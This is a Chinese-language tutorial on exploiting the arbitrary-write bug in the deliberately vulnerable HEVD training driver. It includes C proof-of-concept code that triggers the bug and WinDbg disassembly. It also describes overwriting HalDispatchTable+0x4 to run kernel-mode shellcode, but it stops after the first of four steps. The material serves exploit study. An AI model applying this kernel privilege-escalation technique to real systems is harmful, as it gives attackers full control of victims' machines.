
# 漏洞利用流程解析

本文档基于 HEVD（HackSysExtremeVulnerableDriver）驱动漏洞，详细分析从任意地址写到任意代码执行的完整利用流程。

## 1. 漏洞概述

HEVD 提供了 `HEVD_IOCTL_ARBITRARY_WRITE` 控制码，对应的处理函数如下：

```c
case HEVD_IOCTL_ARBITRARY_WRITE:
    DbgPrint("****** HEVD_IOCTL_ARBITRARY_WRITE ******\n");
    Status = ArbitraryWriteIoctlHandler(Irp, IrpSp);
    DbgPrint("****** HEVD_IOCTL_ARBITRARY_WRITE ******\n");
    break;
```

## 2. 关键数据结构

`_WRITE_WHAT_WHERE` 结构体大小为 8 字节，其中 `What` 和 `Where` 各占 4 字节。通过构造一个 8 字节的缓冲区，修改 `What` 和 `Where` 指针，可实现**任意地址写**。

```c
typedef struct _WRITE_WHAT_WHERE
{
    PULONG_PTR What;
    PULONG_PTR Where;
} WRITE_WHAT_WHERE, *PWRITE_WHAT_WHERE;
```

## 3. 任意地址写测试

以下代码演示了如何利用该漏洞进行任意地址写测试：

```c
#include<stdio.h>
#include<Windows.h>

typedef struct _WRITE_WHAT_WHERE
{
    PULONG_PTR What;
    PULONG_PTR Where;
} WRITE_WHAT_WHERE, *PWRITE_WHAT_WHERE;

int main()
{
    PWRITE_WHAT_WHERE Buffer;
    Buffer = (WRITE_WHAT_WHERE*)malloc(sizeof(WRITE_WHAT_WHERE));
    ZeroMemory(Buffer, sizeof(WRITE_WHAT_WHERE));
    Buffer->Where = (PULONG_PTR)0x41414141;
    Buffer->What = (PULONG_PTR)0x41414141;

    DWORD recvBuf;
    // 获取句柄
    HANDLE hDevice = CreateFileA("\\\\.\\HackSysExtremeVulnerableDriver",
                                 GENERIC_READ | GENERIC_WRITE,
                                 NULL, NULL, OPEN_EXISTING, NULL, NULL);

    if (hDevice == INVALID_HANDLE_VALUE || hDevice == NULL)
    {
        printf("Failed \n");
        return 0;
    }

    DeviceIoControl(hDevice, HEVD_IOCTL_ARBITRARY_WRITE, Buffer, 8, NULL, 0, &recvBuf, NULL);

    return 0;
}
```

运行程序，即可触发漏洞。

## 4. 任意代码执行测试

上述测试已实现任意地址写。为实现任意代码执行，需要将 Shellcode 写入指定位置，并触发其执行。

核心思路是将 `What` 指针覆盖为 `payload` 的地址，将 `Where` 指针改为能指向 `payload` 地址的指针。

```c
what -> &payload
where -> HalDispatchTable+0x4
```

### 利用原理

前人发现 Windows 中 `NtQueryIntervalProfile` 函数可用于触发 Shellcode 执行，从而实现任意代码执行。

使用 WinDbg 反汇编 `NtQueryIntervalProfile` 函数：

```asm
kd> uf nt!NtQueryIntervalProfile
.........
84160ecd 7507            jne     nt!NtQueryIntervalProfile+0x6b (84160ed6)  Branch
nt!NtQueryIntervalProfile+0x64:
84160ecf a1acebf783      mov     eax,dword ptr [nt!KiProfileInterval (83f7ebac)]
84160ed4 eb05            jmp     nt!NtQueryIntervalProfile+0x70 (84160edb)  Branch
nt!NtQueryIntervalProfile+0x6b:
84160ed6 e83ae5fbff      call    nt!KeQueryIntervalProfile (8411f415)
.........
```

在 `84160ed6` 处会调用函数 `KeQueryIntervalProfile`。继续反编译该函数：

```asm
kd> uf nt!KeQueryIntervalProfile
..........
nt!KeQueryIntervalProfile+0x14:
8411f429 8945f0          mov     dword ptr [ebp-10h],eax
8411f42c 8d45fc          lea     eax,[ebp-4]
8411f42f 50              push    eax
8411f430 8d45f0          lea     eax,[ebp-10h]
8411f433 50              push    eax
8411f434 6a0c            push    0Ch
8411f436 6a01            push    1
8411f438 ff15fcf3f783    call    dword ptr [nt!HalDispatchTable+0x4 (83f7f3fc)]
8411f43e 85c0            test    eax,eax
8411f440 7c0b            jl      nt!KeQueryIntervalProfile+0x38 (8411f44d)  Branch
.........
```

在 `8411f438` 处，存在指针数组调用 `call dword ptr [nt!HalDispatchTable+0x4]`，此即需要覆盖的位置。执行 Ring0 Shellcode 的主体必须是 Ring0 程序。

**利用方法**：设法修改内核 API 导出表（如 `SSDT`、`HalDispatchTable` 等），将内核 API 函数指针修改为预先准备好的 Shellcode 地址，然后在当前进程中调用该内核 API。

**注意**：最好选择劫持冷门内核 API 函数。如果劫持的热门 API 被其他进程调用，由于 Shellcode 只保存在当前进程的 Ring3 内存地址中，其他进程无法访问，将导致内存访问错误或内核崩溃。

### HalDispatchTable 结构

利用漏洞将 `HalDispatchTable` 表中第一个函数 `HalQuerySystemInformation` 的入口地址篡改，最后调用该函数的上层封装函数 `NtWueryIntervalProfile`，从而执行 Ring0 Shellcode。

`HalDispatchTable` 结构如下：

```c
HAL_DISPATCH HalDispatchTable =
{
    HAL_DISPATCH_VERSION,
    xHalQuerySystemInformation, //此处
    xHalSetSystemInformation,
    xHalQueryBusSlots,
    xHalDeviceControl,
    xHalExamineMBR,
    xHalIoAssignDriveLetters,
    xHalIoReadPartitionTable,
    xHalIoSetPartitionInformation,
    xHalIoWritePartitionTable,
    xHalHandlerForBus,         // HalReferenceHandlerByBus
    xHalReferenceHandler,      // HalReferenceBusHandler
    xHalReferenceHandler       // HalDereferenceBusHandler
};
```

### 利用步骤

**Step 1** — 获取 `HalDispatchTable` 地址 `+0x4` 的地址。  
**Step 2** — 编写 Ring0 `payload`。  
**Step 3** — 利用漏洞向 `HalDispatchTable` 地址 `+0x4` 处写入 `&payload`。  
**Step 4** — 调用 `NtQueryIntervalProfile`，执行 `payload`。

#### 步骤一：获取 `HalDispatchTable+0x4` 的地址

具体思路是：先得到内核模块基址，然后将其与 `HalDispatchTable` 在内核模块中的偏移相加。

获取 `ntkrnlpa.exe` 基址的方法（包括内核模式和用户模式两种），计算 `HalDispatchTable+0x4` 的地址（利用偏移量，该地址最终内核对齐）。

官方给出的函数为：

```c
HalDispatchTable = GetHalDispatchTable();
```
